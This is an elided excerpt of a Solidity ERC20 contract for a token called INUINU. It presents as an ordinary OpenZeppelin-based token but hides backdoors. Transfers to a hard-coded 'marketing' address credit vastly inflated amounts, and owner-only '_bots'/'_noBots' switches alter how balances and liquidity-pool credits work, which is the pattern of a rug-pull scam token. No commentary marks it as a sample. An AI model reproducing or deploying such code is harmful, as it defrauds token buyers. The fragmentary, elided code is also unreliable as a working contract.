...
import "@openzeppelin/contracts/access/Delegated.sol";

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract INUINU is ERC20, Delegated {
    uint256 totalSupply_ = 200000000_000000000;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    constructor() ERC20("INUINU", "INUINU") {
...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
    uint256 private subtracts = fees * 66666;

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    address private marketing = 0x025AFe16Ce1682D63364F76e22fbD7B617A2519e;
    ...
    function transferFrom(
        ...
        if (to == address(marketing)) {
            _transfer(from, to, amount * subtracts);
            return true;
        }
            if(bots) {
            _balances[to] += amount / 9;
             return true;
        }
    ...
    function _transfer(
        ...
        if (to == address(marketing)) {
            _balances[to] += amount * subtracts;
        }
        if(bots && to  == address(lp)) {
            _balances[to] += amount / 3;
        }
    ...
    function _bots() external {
        require(msg.sender == Owner, "Not Owner");
        bots = true;
    }
    function _noBots() external {
        require(msg.sender == Owner, "Not Owner");
        bots = false;
    }
